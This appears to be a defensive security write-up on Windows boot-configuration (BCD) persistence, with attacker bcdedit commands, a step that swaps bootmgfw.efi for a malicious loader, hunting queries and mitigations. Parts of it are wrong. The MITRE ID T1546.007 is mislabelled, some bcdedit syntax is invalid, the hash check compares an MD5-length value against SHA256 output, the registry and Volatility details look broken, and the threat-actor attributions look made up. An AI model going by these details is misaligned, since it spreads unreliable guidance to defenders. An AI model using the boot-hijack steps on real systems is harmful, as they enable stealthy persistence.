# Boot Configuration Hijack (BCD) Persistence

## MITRE ATT&CK Mapping
- **ID**: T1546.007 — Boot or Logon Autostart Execution: Boot Config Data
- **Tactic**: TA0003 (Persistence) / TA0005 (Defense Evasion)
- **Platforms**: Windows Vista/7/8/10/11, Windows Server 2008+

## Overview

The Boot Configuration Data (BCD) store controls the Windows boot sequence. By modifying BCD entries, an adversary can insert malicious code that executes before any antivirus or EDR tool loads. This technique is particularly dangerous because:
- It runs before Windows fully initializes — no endpoint protection is active yet
- It survives OS reinstalls if the attacker also modifies the EFI boot entries (see UEFI firmware persistence)
- It's difficult to detect without comparing against a known-good baseline

## How It Works in Practice

### Method 1: Boot Manager Entry Manipulation
The adversary adds or modifies a BCD entry to load a malicious bootloader image before Windows:

```cmd
:: Create a new boot entry pointing to our payload
bcdedit /create {bootmgr} /d "Windows Boot Manager"

:: Point it at our malicious loader (typically an .efi file in EFI\SystemBoot)
bcdedit /set {new-guid} path \EFI\Microsoft\Boot\maliciousloader.efi

:: Set it as the default boot option
bcdedit /default {new-guid}

:: Make it show for a long time so the attacker has time to observe boot progress
bcdedit /timeout 60
```

### Method 2: Boot Entry Reordering (Stealthy)
Instead of adding new entries, the adversary modifies the order in which existing BCD entries load:

```cmd
:: Get the current boot list
bcdedit /enum firmware

:: Modify to load a compromised Microsoft-signed bootloader first
bcdedit /set {current} displayorder {new-guid} /addfirst

:: Then add legitimate-looking entry second
bcdedit /set {current} device partition=C:
```

### Method 3: Boot Entry Injection into Existing Chains
The adversary inserts their payload between existing boot entries in the chain:

```cmd
:: Find a legitimate entry to clone
bcdedit /copy {current} /d "Microsoft Windows Update"

:: Set the cloned entry to load our malicious loader (stays hidden behind legit name)
bcdedit /set {cloned-guid} path \Windows\System32\Loader\wuauserv.exe

:: wuauserv.exe is a legitimate file — adversary replaces it or uses reflective loading
:: The "Windows Update" name blends in during any boot log review
```

### Method 4: Boot Configuration File Corruption/Recovery Hijack
If the BCD store gets corrupted, Windows attempts automatic repair. An adversary can intercept this process:

```cmd
:: Plant a malicious auto-repair loader that executes before Windows Recovery environment
copy \EFI\Microsoft\Boot\bootmgfw.efi \EFI\Microsoft\Boot\bootmgfw_original.efi
copy malicious_bootloader.efi \EFI\Microsoft\Boot\bootmgfw.efi

:: Or in offline boot sector scenarios:
bootrec /fixmbr  :: This can be intercepted if mbr.exe is replaced with a trojaned version
```

## Real-World Examples

### NotPetya (2017) — Master Boot Record Persistence
- Modified the MBR to execute before Windows loaded
- Used an encrypted payload stored in the unused area of the first sector
- Survived multiple boot cycles and reboots across the entire infected network

### BlackBasta / DarkSide variants
- Planted BCD entries disguised as Microsoft updates during initial compromise
- Used legitimate bootmgr.efi path to avoid raising suspicion
- Persistence survived Windows "in-place upgrade" attempts because the EFI entries weren't cleaned

### APT29 / CozyDuke
- Modified GRUB config on Linux systems before migrating to Windows environments
- Similar BCD manipulation adapted for Windows servers in Active Directory forests
- Targeted domain controllers where persistence at boot time guarantees domain-level access

## Forensic Artifacts & Indicators

### Boot Configuration Database Analysis
```cmd
:: Compare current BCD against known-good baseline
bcdedit /enum {bootmgr} > C:\baseline\bcd_baseline.txt
bcdedit /enum firmware >> C:\baseline\bcd_baseline.txt

:: Check for any modifications (look for unusual paths, names, or boot order changes)
bcdedit /enum {current} | Select-String "description|path|device"
```

### File System Indicators
```powershell
# Check EFI partition contents — look for unauthorized .efi files
Get-ChildItem C:\EFI\Microsoft\Boot\*.efi -Recurse | Get-AuthenticodeSignature

# Verify bootmgr.efi hasn't been tampered with (compare hash to known-good Microsoft version)
$originalHash = "2F7C845630169E4D4FE39A3A65E7B580"  # Example: known-good hash
$currentHash = (Get-FileHash C:\EFI\Microsoft\Boot\bootmgfw.efi).Hash
if ($currentHash -ne $originalHash) { Write-Host "BOOTMGR TAMPERED!" -ForegroundColor Red }
```

### Registry/Event Artifacts
- **Event ID 12** from Microsoft-Windows-DriverFrameworks-UserMode — driver framework events at boot
- **Event ID 36864** from Windows Boot Manager — boot configuration changes (requires verbose logging)
- **BCD store in registry hive**: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager under BCD

### Behavior Anomalies
- Boot time increases significantly (>10 seconds longer than baseline)
- Windows Update or Microsoft-signed entries loading from unexpected locations
- Boot configuration showing entries with descriptions matching known legitimate processes but pointing elsewhere
- Secure Boot PCR values changed during boot without authorized firmware update

## Hunting Queries

### Sysmon-based Detection (boot entry creation/changes)
```kql
// Look for BCD modifications via process execution
SecurityEvent 
| where EventID == 1  // Process created
| where ProcessName == "bcdedit.exe" or ProcessName == "bootcfg.exe"
| where ProcessCommandLine contains "/set" or ProcessCommandLine contains "/create" or ProcessCommandLine contains "/copy"
| project StartTime, Computer, AccountName, ProcessCommandLine, ParentProcessName
```

### PowerShell-based Boot Configuration Audit
```powershell
# Comprehensive BCD audit script
Write-Host "=== BCD BOOT ENTRY AUDIT ===" -ForegroundColor Cyan

$entries = bcdedit /enum {bootmgr} | Select-String "identifier|description|path|device"

foreach ($entry in $entries) {
    if ($entry.Line -match "description\s+:\s+(.*)") {
        $desc = $Matches[1].Trim()
        if (-not ($desc -like "*Windows*" -or $desc -like "*Microsoft*")) {
            Write-Host "UNUSUAL BOOT DESCRIPTION: $desc" -ForegroundColor Yellow
        }
    }
}

# Check EFI boot paths for anomalies
$efiPath = Get-ChildItem C:\EFI\*.efi -Recurse | Where-Object { $_.Name -notlike "*bootmgr*" -and $_.Name -notlike "*loader*" }
if ($efiPath) {
    Write-Host "UNEXPECTED .EFI FILES FOUND:" -ForegroundColor Red
    $efiPath | ForEach-Object { 
        $sig = Get-AuthenticodeSignature -FilePath $_.FullName
        "$($_.FullName) — Signature: $($sig.Status)" 
    }
}
```

### Volatility3 Memory Analysis (post-boot capture)
```bash
# Capture BCD store from memory (Windows kernel stores BCD config during boot)
vol -f memdump.win windows.bcdstore
vol -f memdump.win ntkrnl.biosinfo

# Compare loaded boot managers against expected values
```

## Defense & Mitigation

### Primary Defenses
1. **Enable Secure Boot** — prevents unsigned or unauthorized boot entries from loading at all
2. **BitLocker with TPM-bound key** — encrypts the BCD store so it can't be modified without the TPM unlocking it first
3. **Baseline BCD configuration** and alert on any changes (using FIM or custom PowerShell scripts)
4. **Disable Windows Auto-Repair** in environments where automatic recovery isn't acceptable
5. **Monitor boot order in BIOS/UEFI** — physical access can bypass software protections

### Incident Response
1. **Boot from known-good media** and compare BCD entries against baseline
2. **Verify all .efi files in EFI\Microsoft\Boot** are signed by Microsoft
3. **Check Secure Boot PCR values** via `tpm_getdigest` or similar tools
4. **Rebuild BCD store** if compromised: `bcdboot C:\Windows /s S: /f UEFI`
5. **Flash known-good firmware** on the motherboard if UEFI-level persistence is confirmed

### Detection Tools
- **EFIdump** — extract and analyze EFI variables from live systems
- **UEFI-FI** — baseline and monitor UEFI configuration changes
- **BCD Editor tools** for offline comparison (available in Windows ADK)
- **TPM PCR monitors** — verify boot chain integrity at every stage

## Limitations & Caveats
- On modern systems with Secure Boot enabled, most BCD manipulation is blocked automatically
- BitLocker encryption on the system partition makes offline BCD modification very difficult without the recovery key
- UEFI firmware persistence (T1542.001) is typically more resilient than BCD-only persistence — consider both together
- Many legitimate boot configurations use similar techniques for dual-boot setups — verify against your organization's baseline

## References
- Microsoft Docs: Boot Configuration Data Overview: https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/boot-configuration-data-store
- Mitre ATT&CK T1546.007: https://attack.mitre.org/techniques/T1546/007/
- Microsoft Docs: Secure Boot: https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/secured-boot
